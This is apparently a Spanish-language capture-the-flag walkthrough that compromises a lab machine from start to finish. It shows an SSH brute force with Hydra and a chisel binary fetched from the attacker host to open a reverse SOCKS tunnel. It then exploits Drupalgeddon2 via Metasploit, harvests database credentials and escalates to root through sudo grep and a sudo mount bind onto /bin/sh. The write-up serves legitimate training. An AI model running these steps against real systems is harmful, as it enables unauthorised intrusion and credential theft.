┌──(kali㉿kali)-[~/Documents/PaQueAigaLujo]
└─$ nmap -sS -p- --open --min-rate 5000 -n -Pn 192.168.56.109 -oN scan.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-20 09:28 EDT
Nmap scan report for 192.168.56.109
Host is up (0.00015s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:62:3D:75 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.40 seconds
                                                                                                                                                                                                                                                  
============================================================================================================================================
                                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Documents/PaQueAigaLujo]
└─$ nano user.txt                                                         


# Usuarios

Carlos
Isabella
Alexandre
Miguel
Elena
Victoria
Anastasia
Sophia
Roberto
James
Catherine
Valentina
Priscilla
Margot
Beatrice
Alessandro
Marcus
Diego
Winston
Maximilian

============================================================================================================================================                                                                                     
┌──(kali㉿kali)-[~/Documents/PaQueAigaLujo]
└─$ hydra -l Sophia -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.109
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[22][ssh] host: 192.168.56.109   login: Sophia   password: dolphins
                                                                                                                                                                                                                                                           
============================================================================================================================================

┌──(kali㉿kali)-[~/Documents/PaQueAigaLujo]
└─$ ssh Sophia@192.168.56.109        

Sophia@TheHackersLabs-PaQueAigaLujo:~$ whoami
Sophia

============================================================================================================================================


Sophia@TheHackersLabs-PaQueAigaLujo:~$ cat /etc/passwd
debian:x:1000:1000:debian,,,:/home/debian:/bin/bash
Sophia:x:1001:1001:,,,:/home/Sophia:/bin/bash
cipote:x:1002:1002:,,,:/home/cipote:/bin/bash

============================================================================================================================================



Análisis de Configuración de Red
Se analizó la configuración de red del sistema comprometido:


Sophia@TheHackersLabs-PaQueAigaLujo:~$ ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:6b:31:6c:d6 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:6bff:fe31:6cd6/64 scope link 
       valid_lft forever preferred_lft forever
============================================================================================================================================


Sophia@TheHackersLabs-PaQueAigaLujo:~$ cat fping.sh 
#!/bin/bash

# Uso: ./fping.sh 192.168.1
# Eso escaneará 192.168.1.1 - 192.168.1.254

RED=$1

if [ -z "$RED" ]; then
  echo "Uso: $0 <red>"
  echo "Ejemplo: $0 192.168.1"
  exit 1
fi

echo "Escaneando red: $RED.0/24 ..."
for i in {1..254}; do
  ping -c 1 -W 1 $RED.$i > /dev/null 2>&1
  if [ $? -eq 0 ]; then
    echo "[+] Host activo: $RED.$i"
  fi
done


Sophia@TheHackersLabs-PaQueAigaLujo:~$ chmod a+x fping.sh 



Sophia@TheHackersLabs-PaQueAigaLujo:~$ ./fping.sh 172.17.0
Escaneando red: 172.17.0.0/24 ...
[+] Host activo: 172.17.0.1
[+] Host activo: 172.17.0.2



============================================================================================================================================

┌──(kali㉿kali)-[~/Downloads]
└─$ python3 -m http.server


Sophia@TheHackersLabs-PaQueAigaLujo:/tmp$ wget http://192.168.56.103:8000/chisel
--2025-09-20 16:15:48--  http://192.168.56.103:8000/chisel
Conectando con 192.168.56.103:8000... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 10240184 (9,8M) [application/octet-stream]
Grabando a: «chisel»

chisel                                                         100%[====================================================================================================================================================>]   9,77M  --.-KB/s    en 0,04s   




============================================================================================================================================

┌──(kali㉿kali)-[~/Downloads]
└─$ ./chisel server --reverse -p 4455 
2025/09/20 10:24:47 server: Reverse tunnelling enabled
2025/09/20 10:24:47 server: Fingerprint vUTdiwu6pAHP9epsI3XyyosgnBXHR9pDd9D4r8nA1g8=
2025/09/20 10:24:47 server: Listening on http://0.0.0.0:4455
2025/09/20 10:25:47 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
2025/09/20 10:33:47 server: session#2: tun: proxy#R:127.0.0.1:1080=>socks: Listening



Sophia@TheHackersLabs-PaQueAigaLujo:/tmp$ ./chisel client 192.168.56.103:4455 R:socks
2025/09/20 16:33:46 client: Connecting to ws://192.168.56.103:4455
2025/09/20 16:33:46 client: Connected (Latency 1.526542ms)


============================================================================================================================================



proxychains4 curl http://172.17.0.2                                

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.2:80  ...  OK

<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
<meta name="MobileOptimized" content="width" />
<meta name="HandheldFriendly" content="true" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="shortcut icon" href="/core/misc/favicon.ico" type="image/vnd.microsoft.icon" />
<link rel="alternate" type="application/rss+xml" title="" href="http://172.17.0.2/rss.xml" />



┌──(kali㉿kali)-[~/Documents/PaQueAigaLujo]
└─$ proxychains4 whatweb 172.17.0.2


http://172.17.0.2 [200 OK] Apache[2.4.25], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[172.17.0.2], MetaGenerator[Drupal 8 (https://www.drupal.org)], PHP[7.2.3], PoweredBy[-block], Script, Title[Welcome to Find your own Style | Find your own Style], UncommonHeaders[x-drupal-dynamic-cache,x-content-type-options,x-generator,x-drupal-cache], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/7.2.3], X-UA-Compatible[IE=edge]
         


============================================================================================================================================
# Metasploit

msf6 > search drupal 8

Matching Modules
================

   #   Name                                           Disclosure Date  Rank       Check  Description
   0   exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection



msf6 > use 0

msf6 exploit(unix/webapp/drupal_drupalgeddon2) > show options

Module options (exploit/unix/webapp/drupal_drupalgeddon2):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DUMP_OUTPUT  false            no        Dump payload command output
   PHP_FUNC     passthru         yes       PHP function to execute
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                yes       Path to Drupal install
   VHOST                         no        HTTP server virtual host




msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 172.17.0.2
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RPORT 80
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set Proxies SOCKS5:127.0.0.1:1080
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set ReverseAllowProxy true
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run



meterpreter > ls


meterpreter > shell
Process 119 created.

whoami
www-data


/bin/bash -i 


www-data@76f1a1515e36:/var/www/html$ whoami
www-data

============================================================================================================================================

www-data@76f1a1515e36:/var/www/html$ cat /etc/password

ballenita:x:1000:1000:ballenita,,,:/home/ballenita:/bin/bash

============================================================================================================================================


www-data@76f1a1515e36:/var/www/html$ grep -r "password" /var/www/html/sites/default/settings.php

<"password" /var/www/html/sites/default/settings.php
 * to replace the database username and password and possibly the host and port
 *   'password' => 'ballenitafeliz', //Cuidadito cuidadín pillin
 * username, password, host, and database name.
 *     'password' => 'sqlpassword',
 * You can pass in the user name and password for basic authentication in the



www-data@76f1a1515e36:/var/www/html$ cat /var/www/html/sites/default/settings.php


/**
 * @code
 * $databases['default']['default'] = array (
 *   'database' => 'database_under_beta_testing', // Mensaje del sysadmin, no se usar sql y petó la base de datos jiji xd
 *   'username' => 'ballenita',
 *   'password' => 'ballenitafeliz', //Cuidadito cuidadín pillin
 *   'host' => 'localhost',
 *   'port' => '3306',
 *   'driver' => 'mysql',
 *   'prefix' => '',
 *   'collation' => 'utf8mb4_general_ci',
 * );
 * @endcode
 */



============================================================================================================================================


www-data@76f1a1515e36:/var/www/html$ su ballenita
su ballenita
Password: ballenitafeliz

ballenita@76f1a1515e36:~$ whoami
ballenita



============================================================================================================================================

ballenita@76f1a1515e36:~$ sudo -l
Matching Defaults entries for ballenita on 76f1a1515e36:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ballenita may run the following commands on 76f1a1515e36:
    (root) NOPASSWD: /bin/ls, /bin/grep


============================================================================================================================================

ballenita@76f1a1515e36:~$ sudo -u root ls /root -al
drwx------ 1 root root 4096 Aug 10 09:43 .
drwxr-xr-x 1 root root 4096 Aug 10 09:36 ..
-rw------- 1 root root   84 Aug 10 09:43 .bash_history
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x 2 root root 4096 Oct 16  2024 .nano
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw-r--r-- 1 root root  169 Mar 14  2018 .wget-hsts
-rw-r--r-- 1 root root   36 Aug 10 09:43 secretitomaximo.txt



ballenita@76f1a1515e36:/tmp$ sudo -u root grep '' /root/secretitomaximo.txt

ElcipotedeChocolate-CipotitoCipoton

============================================================================================================================================



Usuario: cipote
Clave: ElcipotedeChocolate-CipotitoCipoton




Sophia@TheHackersLabs-PaQueAigaLujo:~$ su cipote
Contraseña: 


cipote@TheHackersLabs-PaQueAigaLujo:/home/Sophia$ whoami
cipote


============================================================================================================================================

cipote@TheHackersLabs-PaQueAigaLujo:/home$ cd cipote/
cipote@TheHackersLabs-PaQueAigaLujo:~$ ls
user.txt

cipote@TheHackersLabs-PaQueAigaLujo:~$ cat user.txt 
f3e431cd1129e9879e482fcb2cc151e8  -


============================================================================================================================================


cipote@TheHackersLabs-PaQueAigaLujo:/home/Sophia$ sudo -l
Matching Defaults entries for cipote on TheHackersLabs-PaQueAigaLujo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User cipote may run the following commands on TheHackersLabs-PaQueAigaLujo:
    (ALL) NOPASSWD: /usr/bin/mount


cipote@TheHackersLabs-PaQueAigaLujo:/home/Sophia$ sudo mount -o bind /bin/sh /bin/mount

cipote@TheHackersLabs-PaQueAigaLujo:/home/Sophia$ sudo mount

# whoami
root

# cd root
# ls
auto_deploy.sh  findyourstyle.tar  findyourstyle.zip  root.txt
# cat root.txt
92f0383bba9a98cea4d3087dc4636978  -
# exit


============================================================================================================================================


